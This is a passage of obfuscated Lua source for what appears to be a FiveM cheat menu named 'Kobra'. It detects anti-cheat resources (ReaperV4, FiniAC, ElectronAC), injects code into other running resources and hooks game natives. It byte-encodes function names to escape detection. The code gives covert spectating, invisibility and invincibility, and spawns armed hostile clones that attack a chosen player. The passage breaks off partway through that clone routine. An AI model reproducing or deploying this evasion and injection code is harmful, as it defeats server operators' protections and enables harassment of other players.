            ]],v184,v300));v185=v185 + 1 ;break;end end end end v181:Notify("success","Kobra",string.format("Object '%s' spawned on %d/%d player(s)!",v183,v185, #v182),3066 + 1934 );end;v0.HandleSpectateToggle=function(v186,v187,v188) local v189=0;local v190;local v191;while true do if (v189==0) then if  not v187 then local v711=0 + 0 ;while true do if (v711==(0 -0)) then v186:Notify("error","Kobra","Invalid player ID provided!",4167 -1167 );return;end end end v190=tonumber(v187);v189=1;end if (v189==(1 + 1)) then if v188 then v186:Notify("success","Kobra",("You have started spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v190)) or "Unknown" ,v190),3000);else v186:Notify("error","Kobra",("You have stopped spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v190)) or "Unknown" ,v190),13819 -10819 );end v191=GetResourceState("ReaperV4")=="started" ;v189=9 -6 ;end if ((1 + 0)==v189) then if  not v190 then local v712=0;while true do if ((0 -0)==v712) then v186:Notify("error","Kobra","Invalid server ID format!",3000);return;end end end if (v190==tonumber(GetPlayerServerId(PlayerId()))) then v186:Notify("error","Kobra","You cannot spectate yourself!",3831 -(762 + 69) );return;end v189=6 -4 ;end if (v189==(3 + 0)) then if v191 then local v713=0 + 0 ;local v714;local v715;local v716;while true do if (v713==(4 -2)) then if v715 then local v1059=0;local v1060;local v1061;while true do if (0==v1059) then v1060,v1061=pcall(v715);if  not v1060 then print("[ReaperV4 Spectate] Execution error:",v1061);v186:Notify("error","Kobra","Failed to execute spectate code!",944 + 2056 );else print("[ReaperV4 Spectate] Code executed successfully");end break;end end else local v1062=0;while true do if (v1062==0) then print("[ReaperV4 Spectate] Load error:",v716);v186:Notify("error","Kobra","Failed to load spectate code!",3000);break;end end end break;end if (v713==1) then v714=string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                local createThread = _G[_d(_b("CreateThread"))]
                if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
                return createThread
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                if not players then
                    print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                    return -1
                end
                print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
                for _, pid in ipairs(players) do
                    local serverId = _g(_b("GetPlayerServerId"))(pid)
                    print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                    if serverId == sid then
                        print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                        return pid
                    end
                end
                print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
                return -1
            end
            local function stopSpectate()
                if not _G.osintSpectate or not _G.osintSpectate.enabled then
                    print("[ReaperV4 Spectate] StopSpectate: Not currently spectating")
                    return
                end
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local back = _G.osintSpectate.back
                local heading = _G.osintSpectate.heading
                local wasVisible = _G.osintSpectate.wasVisible
                if back then
                    _g(_b("RequestCollisionAtCoord"))(back.x, back.y, back.z)
                end
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true)
                end
                if heading then
                    _g(_b("SetEntityHeading"))(me, heading)
                end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _g(_b("SetEntityInvincible"))(me, false)
                _G.osintSpectate.enabled = false
                _G.osintSpectate.targetSid = nil
                print("[ReaperV4 Spectate] Stopped spectating")
            end
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local myCoords = _g(_b("GetEntityCoords"))(me)
                if not myCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil")
                    return
                end
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.osintSpectate then _G.osintSpectate = {} end
                _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.osintSpectate.heading = myHeading
                _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.osintSpectate.enabled = true
                _G.osintSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Target player not found!", 3000)
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                if not tCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Failed to get target position!", 3000)
                    return
                end
                _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0 -- Default offset since GetGroundZFor_3dCoord is unavailable
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Spectator mode not supported!", 3000)
                    return
                end
                print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
                _t()(function()
                    while _G.osintSpectate and _G.osintSpectate.enabled do
                        local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                        if cid == -1 then
                            print("[ReaperV4 Spectate] Error: Client ID not found in loop for server ID:", targetSid)
                            break
                        end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then
                            print("[ReaperV4 Spectate] Error: Target ped not found or does not exist")
                            break
                        end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        if not pc then
                            print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil in loop")
                            break
                        end
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                    stopSpectate()
                end)
            end
            local enable = %s
            local sid = %d
            if enable then
                print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
                startSpectate(sid)
            else
                print("[ReaperV4 Spectate] Stopping spectate")
                stopSpectate()
            end
        ]],tostring(v188),v190);v715,v716=load(v714);v713=1 + 1 ;end if (v713==(0 -0)) then print("Spectate Fallback #3 (ReaperV4 detected, running direct)");if  not GetPlayerName(GetPlayerFromServerId(v190)) then v186:Notify("error","Kobra","Target player not found!",3000);print("[ReaperV4 Spectate] Error: No player found for server ID:",v190);return;end v713=1;end end elseif ((GetResourceState("FiniAC")=="started") or (GetResourceState("ElectronAC")=="started")) then local v828=157 -(8 + 149) ;while true do if ((1320 -(1199 + 121))==v828) then print("Spectate Fallback #1");MachoInjectResourceRaw("any",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if _G.osintSpectate.camera then
                        _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                        _g(_b("DestroyCam"))(_G.osintSpectate.camera, false)
                        _G.osintSpectate.camera = nil
                    end
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then
                        local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                        local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                        _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                    _g(_b("SetFocusEntity"))(me)
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local zOffset = 3.0
                    local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                    _G.osintSpectate.camera = cam
                    _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                    _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                    _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                    _t()(function()
                        local cameraReady = false
                        _w(550)
                        cameraReady = true
                        while _G.osintSpectate and _G.osintSpectate.enabled and cameraReady do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                            local camRot = _g(_b("GetCamRot"))(cam, 2)
                            local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                            local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                            local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                            local newYaw = camRot.z - x * 5
                            _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                            _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                            _w(0)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v188),v190));break;end end else print("Spectate Fallback #2");MachoInjectResourceRaw("monitor",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true) end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local groundZ = tCoords.z
                    local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(tCoords.x, tCoords.y, tCoords.z, false)
                    if foundGround then
                        groundZ = zPos
                    end
                    local zOffset = math.max(15.0, tCoords.z - groundZ + 5.0)
                    _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z - zOffset, false, false, false, true)
                    _w(300)
                    _g(_b("FreezeEntityPosition"))(me, true)
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                    _t()(function()
                        while _G.osintSpectate and _G.osintSpectate.enabled do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            local groundZ = pc.z
                            local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(pc.x, pc.y, pc.z, false)
                            if foundGround then
                                groundZ = zPos
                            end
                            local zOffset = math.max(15.0, pc.z - groundZ + 5.0)
                            _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z - zOffset, false, false, false, true)
                            _w(400)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v188),v190));end break;end end end;local v61={"envi-medic","envi-hud","envi-yoga","envi-chopshop","envi-chopshop-v2","envi-foodtrucks","envi-dumpsters","envi-prescriptions","envi-druglabs","lation_laundering"};local function v62() local v192=0 + 0 ;while true do if (v192==(0 -0)) then for v637,v638 in ipairs(v61) do if (GetResourceState(v638)=="started") then return v638;end end return nil;end end end local v63=nil;if ((GetResourceState("es_extended")=="started") and (GetResourceState("timeless-emotes")=="started")) then v63="es_extended";elseif ((GetResourceState("core")=="started") and (GetResourceState("timeless-emotes")=="started")) then v63="core";end v0.EnableInvisibility=function(v193) local v194=0;local v195;while true do if (v194==4) then if  not _G.osintInvisibility.enabled then local v717=0 + 0 ;local v718;while true do if ((469 -(304 + 165))==v717) then _G.osintInvisibility.enabled=true;v718=PlayerPedId();v717=1 + 0 ;end if (v717==(161 -(54 + 106))) then _G.osintInvisibility.wasVisible=IsEntityVisible(v718);SetEntityVisible(v718,false,false);v717=1971 -(1618 + 351) ;end if (v717==2) then CreateThread(function() while _G.osintInvisibility and _G.osintInvisibility.enabled  do local v1063=PlayerPedId();if (v1063 and DoesEntityExist(v1063)) then SetEntityVisible(v1063,false,false);end Wait(500);end end);break;end end end break;end if (v194==(1 + 0)) then v195("CreateThread",function(v639,...) return v639(...);end);v195("PlayerPedId",function(v640,...) return v640(...);end);v194=1018 -(10 + 1006) ;end if (v194==(0 + 0)) then v195=nil;function v195(v641,v642) local v643=_G[v641];if ( not v643 or (type(v643)~="function")) then return;end _G[v641]=function(...) return v642(v643,...);end;end v194=1 + 0 ;end if (v194==(9 -6)) then v195("SetEntityVisible",function(v644,v645,v646,v647) local v648=1033 -(912 + 121) ;while true do if (v648==(0 + 0)) then if (_G.osintInvisibility and _G.osintInvisibility.enabled) then return v644(v645,false,v647);end return v644(v645,v646,v647);end end end);if  not _G.osintInvisibility then _G.osintInvisibility={enabled=false,wasVisible=true};end v194=1293 -(1140 + 149) ;end if (v194==(2 + 0)) then v195("IsEntityVisible",function(v649,...) return true;end);v195("IsEntityVisibleToScript",function(v650,...) return true;end);v194=3 -0 ;end end end;v0.DisableInvisibility=function(v196) if (_G.osintInvisibility and _G.osintInvisibility.enabled) then local v498=0 + 0 ;local v499;while true do if (v498==(3 -2)) then if (v499 and DoesEntityExist(v499)) then SetEntityVisible(v499,_G.osintInvisibility.wasVisible,false);end break;end if (v498==0) then _G.osintInvisibility.enabled=false;v499=PlayerPedId();v498=1 -0 ;end end end end;v0.HandleAttackClonePlayer=function(v197,v198) if ( not v198 or ( #v198==(0 + 0))) then return;end local v199=table.concat(v198,",");MachoHookNative(2596915000000000000 -1915701056 ,function(v301) return true,v301;end);MachoHookNative(15321135000000000000 -(219 + 1558) ,function(v302,v303,v304,v305,v306,v307,v308) return true,v302,v303,v304,v305,v306,v307,v308;end);MachoInjectResourceRaw("monitor",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
